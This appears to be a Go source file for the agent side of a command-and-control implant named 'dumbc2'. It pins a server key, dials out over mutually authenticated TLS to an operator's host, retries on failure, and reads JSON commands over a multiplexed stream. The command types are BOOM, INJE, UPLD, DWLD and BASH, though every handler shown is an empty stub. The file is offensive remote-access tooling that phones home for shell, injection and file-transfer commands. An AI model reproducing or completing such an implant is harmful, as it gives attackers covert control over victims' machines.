package useri

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/hashicorp/yamux"
	"github.com/kmahyyg/dumbc2/buildtime"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"log"
	"net"
	"os"
	"time"
)

var ymcli *yamux.Session

func StartAgent(userOP *config.UserOperation) {
	servFGP := make([]byte, base64.StdEncoding.DecodedLen(len(buildtime.RemoteFingerprint)))
	_, err := base64.StdEncoding.Decode(servFGP, buildtime.RemoteFingerprint)
	if err != nil {
		log.Fatalln("Server Pinned Key Error.")
	}
	var errCounter = 0
	var curConn net.Conn
	for {
		if errCounter >= 3 {
			return
		}
		curConn, err = transport.TLSDialer(servFGP, buildtime.ClientCertificatePEM, buildtime.ClientCertificateKey, buildtime.CACertificate, userOP.ListenAddr)
		if err != nil {
			errCounter++
			log.Println(err)
			time.Sleep(5 * time.Minute)
		} else {
			break
		}
	}
	_ = respond2Cmd(curConn)
}

func respond2Cmd(curConn net.Conn) error {
	var err error
	ymconf := yamux.Config{
		AcceptBacklog:          256,
		EnableKeepAlive:        true,
		KeepAliveInterval:      time.Second * 20,
		ConnectionWriteTimeout: time.Minute * 5,
		MaxStreamWindowSize:    256 * 1024,
		LogOutput:              os.Stderr,
	}
	defer func() {
		_ = ymcli.Close()
		_ = curConn.Close()
	}()
	ymcli, err = yamux.Client(curConn, &ymconf)
	if err != nil {
		log.Fatalln(err)
	}
	ctrlstem, err := ymcli.Open()
	if err != nil {
		log.Fatalln(err)
	}
	defer func() {
		_ = ctrlstem.Close()
	}()
	for {
		var ccmd *remoteop.CmdMsg
		var resp *remoteop.CmdMsg
		smbuf := make([]byte, 1300)
		// the single control message cannot be more than 1300 bytes
		// so read once
		rdint, err := ctrlstem.Read(smbuf)
		if err != nil {
			log.Println(err)
			return err
		} else {
			ccmd = &remoteop.CmdMsg{}
			err := json.Unmarshal(smbuf[0:rdint], ccmd)
			if err != nil {
				log.Println("Internal Error.")
				log.Fatalln(err)
			}
		}
		if ccmd.Status != remoteop.StatusOK {
			// server side command should always use status=0
			log.Fatalln(err)
		} else {
			switch ccmd.Cmd {
			case remoteop.CommandBOOM:
			case remoteop.CommandINJE:
			case remoteop.CommandUPLD:
			case remoteop.CommandDWLD:
			case remoteop.CommandBASH:

			default:
				log.Fatalln("Internal error.")
			}
		}
	}
	return nil
}

func successResp(req *remoteop.CmdMsg) (resp *remoteop.CmdMsg) {
	resp = &remoteop.CmdMsg{
		Status:      remoteop.StatusOK,
		Cmd:         req.Cmd,
		Msg:         "success",
		HasNext:     false,
		NextIsBin:   false,
		NextSize:    0,
		NextBinHash: "",
	}
	return
}

func failedResp(req *remoteop.CmdMsg, status int, err error) (resp *remoteop.CmdMsg) {
	resp = &remoteop.CmdMsg{
		Status:      status,
		Cmd:         req.Cmd,
		Msg:         fmt.Sprintf("%s", err),
		HasNext:     false,
		NextIsBin:   false,
		NextSize:    0,
		NextBinHash: "",
	}
	return
}